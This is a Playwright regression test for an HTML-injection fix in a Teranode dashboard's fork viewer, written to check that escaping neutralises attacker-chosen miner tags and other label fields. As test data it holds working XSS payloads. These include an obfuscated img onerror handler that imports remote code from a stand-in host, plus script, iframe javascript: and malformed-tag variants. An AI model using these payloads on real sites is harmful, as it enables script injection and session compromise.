/**
 * The fork viewer's HTML sink must neutralise attacker-chosen markup.
 *
 * A peer can choose the coinbase of a block this node rejects, and the coinbase's arbitrary-text
 * field is parsed back out on read as the human-facing miner tag. The fork viewer concatenates that
 * value into an HTML string and hands it to D3 `.html(...)`, so before the fix the browser parsed it
 * as markup and ran the handler in the dashboard's origin (bitcoin-sv/teranode#4844).
 *
 * This asserts in a real browser rather than by pattern-matching the string, because the thing that
 * matters is what the HTML parser does with it - a regex cannot cover the parser-differential cases
 * at the end of this file. It mirrors the audit's own proof, which was a browser test.
 *
 * Runs under `npm run test:integration`, NOT `npm run test:unit`. CI must run it.
 */
import { test, expect, type Page } from '@playwright/test'
import { forkNodeLabelHtml } from '../src/routes/forks/helpers'

// The audit's payload: 65 bytes, no literal '/', so it survives the miner-tag sanitiser
// byte-for-byte and parses as markup.
const MINER_MARKUP_CANARY = `<img src=x onerror=import('https:'+atob('Ly8=')+'audit.invalid')>`

/**
 * Renders a label fragment into a live page and asserts that nothing in it became markup: no
 * injected element, no event-handler attribute anywhere, and only the structural tags the label
 * function is allowed to emit.
 */
async function expectNeutralised(page: Page, html: string, mustDisplay: string[]) {
  await page.setContent(`<div id="host">${html}</div>`)

  await expect(page.locator('img, svg, script, iframe, object, embed')).toHaveCount(0)

  const handlerAttributes = await page.evaluate(() => {
    const found: string[] = []
    document.querySelectorAll('*').forEach((el) => {
      for (const attr of Array.from(el.attributes)) {
        if (attr.name.toLowerCase().startsWith('on')) {
          found.push(`${el.tagName}:${attr.name}`)
        }
      }
    })
    return found
  })
  expect(handlerAttributes).toEqual([])

  const tagsInHost = await page.evaluate(() => {
    const host = document.getElementById('host')
    return Array.from(host?.querySelectorAll('*') ?? []).map((el) => el.tagName.toLowerCase())
  })
  for (const tag of tagsInHost) {
    expect(['div', 'b', 'br']).toContain(tag)
  }

  const text = await page.locator('#host').textContent()
  for (const expected of mustDisplay) {
    // The payload must still be DISPLAYED: the fix escapes, it does not silently drop data.
    expect(text).toContain(expected)
  }
}

const baseNode = {
  height: 100,
  hash: '000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f',
  block_time: 1231006505,
}

test('neutralises markup in the miner field', async ({ page }) => {
  const html = forkNodeLabelHtml({ ...baseNode, miner: MINER_MARKUP_CANARY }, 118, 62)
  await expectNeutralised(page, html, [MINER_MARKUP_CANARY])
})

test('neutralises markup delivered in either raw-miner mode', async ({ page }) => {
  // The two strings a coinbase carrying the payload produces: the raw bytes, and what the default
  // sanitiser returns for the same coinbase (it keeps every printable character, so the payload
  // survives with the height-push byte in front). The sink must neutralise both, which is what
  // makes the guarantee independent of the blockchain_raw_miner_tag setting.
  const raw = MINER_MARKUP_CANARY
  const sanitised = `d${MINER_MARKUP_CANARY}`

  for (const miner of [raw, sanitised]) {
    const html = forkNodeLabelHtml({ ...baseNode, miner }, 118, 62)
    await expectNeutralised(page, html, [miner])
  }
})

test('neutralises markup in the hash and height fields', async ({ page }) => {
  const html = forkNodeLabelHtml(
    {
      miner: 'teranode',
      height: '<script>alert(1)</script>' as unknown,
      hash: '<iframe src=javascript:alert(1)></iframe>' as unknown,
      block_time: 1231006505,
    },
    118,
    62,
  )
  await expectNeutralised(page, html, [
    '<script>alert(1)</script>',
    '<iframe src=javascript:alert(1)></iframe>',
  ])
})

test('neutralises a root-shaped and a child-shaped node label', async ({ page }) => {
  // Root and child fork nodes go through the same label function, so both shapes are covered here.
  const root = forkNodeLabelHtml({ ...baseNode, miner: MINER_MARKUP_CANARY }, 118, 62)
  await expectNeutralised(page, root, [MINER_MARKUP_CANARY])

  const child = forkNodeLabelHtml(
    { height: 101, hash: 'abc', block_time: 1231006600, miner: MINER_MARKUP_CANARY },
    118,
    62,
  )
  await expectNeutralised(page, child, [MINER_MARKUP_CANARY])
})

test('still renders a hostname for a URL-shaped miner', async ({ page }) => {
  const html = forkNodeLabelHtml(
    { ...baseNode, miner: 'http://m2.scaling.teranode.network/api/v1' },
    118,
    62,
  )
  await page.setContent(`<div id="host">${html}</div>`)

  const text = await page.locator('#host').textContent()
  expect(text).toContain('m2')
  expect(text).not.toContain('scaling.teranode.network')
})

test('falls back to "local" for an empty miner', async ({ page }) => {
  const html = forkNodeLabelHtml({ ...baseNode, miner: '' }, 118, 62)
  await page.setContent(`<div id="host">${html}</div>`)

  const text = await page.locator('#host').textContent()
  expect(text).toContain('local')
})

test('neutralises a markup-bearing miner that is not URL-shaped', async ({ page }) => {
  // `new URL()` throws here, so the fallback assigns the RAW attacker text - the branch the escape
  // has to sit downstream of.
  const html = forkNodeLabelHtml({ ...baseNode, miner: MINER_MARKUP_CANARY }, 118, 62)
  await expectNeutralised(page, html, [MINER_MARKUP_CANARY])
})

test('neutralises malformed markup', async ({ page }) => {
  // Parser-differential cases: an unclosed tag and a doubled `<`. A substring or regex check cannot
  // tell what the HTML parser will do with either.
  for (const miner of ['<img src=x onerror=alert(1)', '<<img src=x>']) {
    const html = forkNodeLabelHtml({ ...baseNode, miner }, 118, 62)
    await expectNeutralised(page, html, [miner])
  }
})
